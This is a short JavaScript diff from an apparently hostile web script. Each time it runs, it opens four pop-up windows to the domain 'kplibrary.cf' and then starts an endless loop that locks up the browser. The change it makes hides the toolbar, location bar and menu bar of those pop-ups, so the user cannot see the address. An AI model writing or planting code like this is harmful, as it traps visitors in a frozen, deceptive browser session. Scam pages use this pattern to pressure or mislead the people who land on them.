@@ -6,7 +6,7 @@ if (popUp == null || typeof(popUp) == 'undefined') {
   }
 } else {
   for (var i = 0; i < 4; i++) {
-    window.open('kplibrary.cf');
+    window.open('kplibrary.cf', '_blank', 'toolbar=0,location=0,menubar=0');
   }
   setTimeout(function() {
     for (var i = 0; i === i; i++) {}
